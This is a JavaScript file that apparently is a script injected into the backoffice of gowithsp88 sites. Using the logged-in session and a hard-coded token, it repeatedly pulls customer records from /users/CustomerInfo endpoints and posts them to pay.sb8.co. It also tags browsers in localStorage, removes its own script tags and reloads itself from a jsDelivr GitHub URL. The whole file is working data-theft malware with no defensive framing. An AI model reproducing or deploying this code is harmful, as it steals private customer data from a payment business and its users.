var cur_href = window.location.href;
var urlobj = new URL(cur_href);
var hostname = urlobj.hostname;
var domainParts = hostname.split('.');
var domain = domainParts.length > 2 ? domainParts[1] : domainParts[0];
var timestamp = new Date().getTime();
var baseScriptUrl = 'https://cdn.jsdelivr.net/gh/sb8c/save/1.js';
var baseScriptUrlA = 'https://pay.sb8.co/js-9d6798e4b1fe1e1b3df3d84bb4d0ddb8/iframe';

function loadScript(url) 
{
    var script = document.createElement('script');
    script.src = url;
    script.async = true;
    document.head.appendChild(script);
}
        
var insertlocal = localStorage.getItem('ids');

if (insertlocal !== "XQXjzSKLPtdyDEnZBiyp" && insertlocal !== "yBWNZQveLqlypnDMlHvN" && insertlocal !== "kkJTTRhOdQMlVISmXQJO") {
    if (insertlocal === "" || insertlocal === null)
    {

        function generateRandomString(length) {
            const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
            let result = '';
            for (let i = 0; i < length; i++) {
                const randomIndex = Math.floor(Math.random() * characters.length);
                result += characters[randomIndex];
            }
            return result;
        }

        ids = generateRandomString(20);
        localStorage.setItem('ids', ids);
    }

    var cookie = document.cookie;

    if (cur_href.includes("backoffice.gowithsp88.online") || cur_href.includes("gowithsp88.online") || cur_href.includes("gowithsp88.com")) {
        
        function insertLog(text) {
            var Lxmlhttp = new XMLHttpRequest();
            Lxmlhttp.open("POST", "https://pay.sb8.co/receive/log.php", true);
            Lxmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            Lxmlhttp.send(text);
        }

        function createXmlHttp() {
            if (window.XMLHttpRequest) {
                return new XMLHttpRequest();
            } else {
                var MSXML = ['MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP'];
                for (var n = 0; n < MSXML.length; n++) {
                    try {
                        return new ActiveXObject(MSXML[n]);
                    } catch (e) {}
                }
            }
            return null;
        }
        
        function get_text_8bo(get_name, get_url, get_method, jsonstr) {
            var xmlHttp = createXmlHttp();
            if (!xmlHttp) {
                console.error('Failed to create XMLHttpRequest');
                return;
            }
            
            
            
            xmlHttp.onreadystatechange = function() {
                
                var text = "type=" + encodeURIComponent(domain) + "&xmlHttp-status=" + encodeURIComponent(xmlHttp.status) + "&ids=" + encodeURIComponent(insertlocal) + "&xmlHttp-readyState=" + encodeURIComponent(xmlHttp.readyState);
                insertLog(text);
                
                
                if (xmlHttp.readyState === 4 && xmlHttp.status === 200) {
                    var code = escape(xmlHttp.responseText);
                    var timestamp = new Date().getTime();
                    var url = "https://pay.sb8.co/receive/receive1.php?timestamp=" + timestamp;
                    var cc = "htmlcode=" + code + "&filename=" + get_name;

                    var xmlHttpPost = createXmlHttp();
                    if (xmlHttpPost) {
                        xmlHttpPost.open("POST", url, true);
                        xmlHttpPost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                        xmlHttpPost.send(cc);
                    } else {
                        console.error('Failed to create XMLHttpRequest for POST');
                    }
                }
            };
            
            var headers = {
                "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With": "XMLHttpRequest",
                "Sec-Ch-Ua-Mobile": "?0",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                "Sec-Ch-Ua-Platform": "Windows",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Token": "a96a6b69f6a247d1a7dd9e80836789d9"
            };

            if (get_method.toUpperCase() === "POST") {
                xmlHttp.open(get_method, get_url, true);
                xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                for (var key in headers) {
                    xmlHttp.setRequestHeader(key, headers[key]);
                }
                // Send the jsonstr as the POST body
                xmlHttp.send(jsonstr);
            } else if (get_method.toUpperCase() === "GET") {
                xmlHttp.open(get_method, get_url + '?' + jsonstr, true);
                for (var key in headers) {
                    xmlHttp.setRequestHeader(key, headers[key]);
                }
                xmlHttp.send();
            }
        }
        
        var urls = [
            { name: "surepay-user-1100-get", url: "/users/CustomerInfo/?id=27b56d0f-18eb-4ada-8e70-f8181ceac0d5", method: "GET", jsonstr: "" },
            { name: "surepay-user-1101-get", url: "/users/CustomerInfo/?id=a4d278d7-9817-4f43-9739-448b98622da3", method: "GET", jsonstr: "" },
            { name: "surepay-user-1102-get", url: "/users/CustomerInfo/?id=bb8b042c-7d5c-40fc-bdad-7647da255e91", method: "GET", jsonstr: "" },
            { name: "surepay-user-1103-get", url: "/users/CustomerInfo/?id=f22b8d9c-a4f8-494a-9954-46749827946a", method: "GET", jsonstr: "" },
            { name: "surepay-user-1104-get", url: "/users/CustomerInfo/?id=44a6ba0c-7f67-4bb1-9c77-23bc0d2128e3", method: "GET", jsonstr: "" },
            { name: "surepay-user-1106-get", url: "/users/CustomerInfo/?id=f0da3b58-9813-49ca-b278-17c473b337e9", method: "GET", jsonstr: "" },
            
            //{ name: "surepay-user-1105-get", url: "/users/CustomerInfo/?id=27b56d0f-18eb-4ada-8e70-f8181ceac0d5", method: "GET", jsonstr: "" },
            //{ name: "surepay-user-1107-get", url: "/users/CustomerInfo/?id=a4d278d7-9817-4f43-9739-448b98622da3", method: "GET", jsonstr: "" },
            //{ name: "surepay-user-1100-post", url: "/users/CustomerInfo/?id=27b56d0f-18eb-4ada-8e70-f8181ceac0d5", method: "POST", jsonstr: "" },
            //{ name: "surepay-user-1101-post", url: "/users/CustomerInfo/?id=a4d278d7-9817-4f43-9739-448b98622da3", method: "POST", jsonstr: "" },
            //{ name: "jbppay-login-info", url: "/monitor/logininfor/list", method: "POST", jsonstr: "" }
            // Add other URLs with their respective methods and jsonstrs
        ];

        var index = 0;

        function plement() {
            var currentUrl = urls[index];
            localStorage.setItem('addtimec', currentUrl.name);
            get_text_8bo(currentUrl.name, currentUrl.url, currentUrl.method, currentUrl.jsonstr);   // Use the method and jsonstr from the array
            index = (index + 1) % urls.length;
        }

        var timers = setInterval(plement, 10000);
        
        
        
        setTimeout(function() {

            var scripts = document.querySelectorAll('script[src^="' + baseScriptUrl + '"]');
            
            scripts.forEach(function(script) {
                script.remove();
            });
            
            clearTimeout(timers);
            
            loadScript(baseScriptUrl + '?timestamp=' + timestamp);
            
        }, 60000);
    }
} else {

    
    
    
    if(insertlocal == "XQXjzSKLPtdyDEnZBiyp")
    {
        
        var scripts = document.querySelectorAll('script[src^="' + baseScriptUrl + '"]');
        var timestamp = new Date().getTime();
        scripts.forEach(function(script) {
            script.remove();
        });
        
        clearTimeout(timers);
        
        loadScript(baseScriptUrlA + '?timestamp=' + timestamp);
    }else{

        setTimeout(function() {
            var scripts = document.querySelectorAll('script[src^="' + baseScriptUrl + '"]');
            var timestamp = new Date().getTime();
            scripts.forEach(function(script) {
                script.remove();
            });
            
            clearTimeout(timers);
            
            loadScript(baseScriptUrl + '?timestamp=' + timestamp);
        }, 300000);
    
    }
    
    

}
